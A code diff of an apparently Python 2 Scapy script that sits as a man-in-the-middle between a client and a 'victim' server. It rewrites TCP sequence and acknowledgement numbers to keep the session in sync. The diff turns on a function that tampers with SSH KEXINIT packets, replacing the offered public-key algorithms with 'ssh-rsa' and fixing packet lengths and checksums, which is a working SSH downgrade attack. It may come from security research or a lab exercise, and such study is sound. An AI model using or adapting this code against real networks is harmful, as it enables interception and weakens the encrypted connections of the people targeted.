@@ -26,7 +26,7 @@ def send_pkt (packet):
 # Forward captured packet
 def forward(packet):
 	roleplay(packet)
-	# check_payload(packet);
+	check_payload(packet);
 	myMAC = packet[Ether].dst
 	packet[Ether].dst = EX.get(packet[Ether].src)
 	packet[Ether].src = myMAC
@@ -70,20 +70,23 @@ def roleplay(packet):
 				client["plen"] = len(packet[Raw].load)
 			#endif
 			# expected ack
+			assigned_ack = ""
 			client["expected_ack"] = client["seq"] + client["plen"]
 			if server["expected_ack"] != None and server["expected_ack"] != client["ack"]:
 				packet[TCP].ack = server["expected_ack"]
-				print "client: assigned ack " + str(server["expected_ack"])
+				assigned_ack = " >> " + str(server["expected_ack"])
 			#endif
 			# expected seq from client to server
+			assigned_seq = ""
 			if server["ack"] != None and client["seq"] != server["ack"]:
 				packet[TCP].seq = server["ack"]
-				print "client: assigned seq " + str(server["ack"])
+				assigned_seq = " >> " + str(server["ack"])
 			#endif
 			print "From client:"
-			print "SEQ: " + str(client["seq"])
-			print "ACK: " + str(client["ack"])
+			print "SEQ: " + str(client["seq"]) + assigned_seq
+			print "ACK: " + str(client["ack"]) + assigned_ack
 			print "LEN: " + str(client["plen"])
+			print "ECK: " + str(client["expected_ack"])
 			print " "
 		elif EX.get(packet[Ether].src) == victimMAC:
 			# packet from server
@@ -99,20 +102,24 @@ def roleplay(packet):
 			if packet.haslayer(Raw):
 				server["plen"] = len(packet[Raw].load)
 			#endif
+			# expected ack
+			assigned_ack = ""
 			server["expected_ack"] = server["seq"] + server["plen"]
 			if client["expected_ack"] != None and client["expected_ack"] != server["ack"]:
 				packet[TCP].ack = client["expected_ack"]
-				print "server: assigned ack " + str(client["expected_ack"])
+				assigned_ack = " >> " + str(client["expected_ack"])
 			#endif
 			# expected seq from server to client
+			assigned_seq = ""
 			if client["ack"] != None and server["seq"] != client["ack"]:
 				packet[TCP].seq = client["ack"]
-				print "server: assigned seq " + str(client["ack"])
+				assigned_seq = " >> " + str(client["ack"])
 			#endif
 			print "From server:"
-			print "SEQ: " + str(server["seq"])
-			print "ACK: " + str(server["ack"])
+			print "SEQ: " + str(server["seq"]) + assigned_seq
+			print "ACK: " + str(server["ack"]) + assigned_ack
 			print "LEN: " + str(server["plen"])
+			print "ECK: " + str(server["expected_ack"])
 			print " "
 		#endif
 	#endif
@@ -126,22 +133,29 @@ def check_payload(packet):
 		return
 	#endif
 	try:
-		if packet[TCP].sport == 22:
-			ssh = SSH(packet[Raw].load)
+		ssh = SSH(packet[Raw].load)
+		if ord(ssh.SSH_MSG_KEXINIT) == 20:
 			old_len = len(packet[Raw].load)
-			if ord(ssh.SSH_MSG_KEXINIT) == int("14",16):
-				ssh.kex_algorithms = "diffie-hellman-group-exchange-sha1"
-				payload_new = ssh.reconstruct()
-				packet[Raw].load = payload_new
-				diff_len = old_len - len(payload_new)
-				packet[IP].len = packet[IP].len - diff_len
-				del packet[TCP].chksum
-				del packet[IP].chksum
-			#endif
+			print ssh.pub_key_algorithms
+			ssh.pub_key_algorithms = replace_payload(ssh.pub_key_algorithms,"ssh-rsa,")
+			print ssh.pub_key_algorithms
+			print " "
+			payload_new = ssh.reconstruct()
+			packet[Raw].load = payload_new
+			diff_len = old_len - len(payload_new)
+			packet[IP].len = packet[IP].len - diff_len
+			del packet[TCP].chksum
+			del packet[IP].chksum
 		#endif
 	except Exception as error:
 		print repr(error)
 	#endtry	
+#enddef
+
+def replace_payload (old, new):
+	# This is fucking stupid!
+	old_len = len(old)
+	return new + "x" * (old_len - len(new))
 #enddef
 
 if __name__ == '__main__':
